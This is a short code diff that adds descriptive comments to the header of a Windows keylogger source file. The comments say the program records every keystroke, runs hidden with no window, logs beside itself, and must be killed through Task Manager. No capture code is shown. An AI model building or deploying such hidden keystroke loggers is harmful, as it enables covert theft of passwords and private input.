@@ -1,5 +1,9 @@
 //keylogger.cpp
 //ATTENTION! Use this code only for educational purposes!
+//This program and code can help you to log every key press on your computer.
+//After startup, the program is hidden (there is no console or GUI).
+//The log file is written to the same directory as where is the running program.
+//After use the program, you need to end the keylogger.exe process through the Windows Task Manager. 
 #include <iostream>
 #include <windows.h>
 
